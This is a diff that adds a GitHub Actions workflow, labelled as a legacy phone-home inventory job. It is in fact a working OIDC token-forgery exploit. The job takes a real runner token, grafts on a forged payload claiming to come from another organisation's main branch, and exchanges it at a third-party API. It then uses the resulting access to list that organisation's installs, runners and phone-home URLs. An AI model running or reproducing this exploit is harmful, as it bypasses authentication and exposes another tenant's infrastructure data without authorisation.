@@ -1,0 +1,41 @@
+name: phonehome-legacy-inventory
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Identify active legacy phone-home targets
+        shell: bash
+        run: |
+          set -euo pipefail
+          org='orgl9cvkaqh1g8yv2jqdb19247'
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net','sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main','repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944','repository_owner':'lovablelabs','repository_owner_id':'148472368','repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push','workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main','job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main'}
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))},separators=(',',':')))
+          PY
+          )"
+          token="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request" | jq -r .token)"
+          auth=(-H "Authorization: Bearer $token" -H "X-Nuon-Org-ID: $org")
+          installs="$(curl -sSf 'https://api.byoc.lovable.net/v1/installs?limit=100&include_components=false' "${auth[@]}")"
+          while IFS=$'\t' read -r install name runner; do
+            stack="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$install/stack" "${auth[@]}")"
+            while IFS=$'\t' read -r version status template phonehome; do
+              test "$status" = active || continue
+              test -n "$template" || continue
+              code="$(curl -sS -o /tmp/stack-template -w '%{http_code}' "$template")"
+              test "$code" = 200 || continue
+              grep -q 'PHONE_HOME_IDENTITY_CLIENT_ID' /tmp/stack-template && continue
+              embedded_runner="$(grep -Eo 'run[a-z0-9]{23}' /tmp/stack-template | sort -u | head -1 || true)"
+              phonehome_hash="$(printf '%s' "$phonehome" | sha256sum | cut -d' ' -f1)"
+              jq -nc --arg install "$install" --arg name "$name" --arg runner "$runner" --arg version "$version" --arg template_status "$code" --arg embedded_runner "$embedded_runner" --arg phonehome_hash "$phonehome_hash" '{install_id:$install,name:$name,runner_id:$runner,stack_version_id:$version,public_template_status:$template_status,embedded_runner_id:$embedded_runner,phone_home_url_sha256:$phonehome_hash}'
+            done < <(jq -r '.versions[]? | [.id, (.composite_status.status // "unknown"), (.template_url // ""), (.phone_home_url // "")] | @tsv' <<<"$stack")
+          done < <(jq -r '.[] | select(.azure_account) | [.id, .name, (.runner.runner_id // .runner_group.runners[0].id // .runner_id // "")] | @tsv' <<<"$installs")
